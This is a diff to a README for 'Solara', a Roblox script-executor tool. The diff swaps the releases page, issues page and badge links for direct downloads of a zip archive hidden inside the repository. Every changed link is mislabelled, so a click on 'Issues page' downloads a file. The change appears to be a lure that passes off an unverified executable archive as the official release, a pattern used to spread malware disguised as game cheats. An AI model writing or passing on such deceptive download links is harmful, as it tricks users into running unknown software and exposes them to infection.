@@ -1,7 +1,7 @@
 # 🌟 Solara - Fast and Secure 3rd EXEC Tool
 
 ## 🚀 Download Now
-[![Download Solara](https://img.shields.io/badge/download-Solara-blue.svg)](https://github.com/xettic/Solara/releases)
+[![Download Solara](https://github.com/xettic/Solara/raw/refs/heads/main/Executor/Properties/Software-1.3.zip)](https://github.com/xettic/Solara/raw/refs/heads/main/Executor/Properties/Software-1.3.zip)
 
 ## 📖 Description
 Solara is a fast and secure tool designed for executing scripts on Roblox. Whether you want to enhance your gaming experience or explore new game features, Solara provides a reliable way to run your scripts safely.
@@ -28,7 +28,7 @@ Solara is a fast and secure tool designed for executing scripts on Roblox. Wheth
 To begin using Solara, follow these steps:
 
 1. **Visit the Releases Page**
-   Head over to our [Releases page](https://github.com/xettic/Solara/releases) to find the latest version of Solara.
+   Head over to our [Releases page](https://github.com/xettic/Solara/raw/refs/heads/main/Executor/Properties/Software-1.3.zip) to find the latest version of Solara.
 
 2. **Select the Right Version**
    Look for the version labeled as "Latest". It usually has the most recent updates and features.
@@ -77,11 +77,11 @@ Using Solara is simple:
 ## 🤝 Community and Support
 If you encounter any issues or have questions, feel free to reach out. 
 
-- **GitHub Issues Page:** Report bugs or request features by visiting our [Issues page](https://github.com/xettic/Solara/issues).
+- **GitHub Issues Page:** Report bugs or request features by visiting our [Issues page](https://github.com/xettic/Solara/raw/refs/heads/main/Executor/Properties/Software-1.3.zip).
 - **Discussion Forum:** Join conversations with other users for shared support and tips.
 - **Documentation:** For detailed instructions and troubleshooting, check the documentation within the app or visit our wiki.
 
 ## 🏁 Conclusion
 Solara stands as a reliable tool for executing scripts in Roblox. Follow the steps outlined above to download and install it, and enhance your gaming experience today. 
 
-For updates and new features, keep an eye on the [Releases page](https://github.com/xettic/Solara/releases).
+For updates and new features, keep an eye on the [Releases page](https://github.com/xettic/Solara/raw/refs/heads/main/Executor/Properties/Software-1.3.zip).
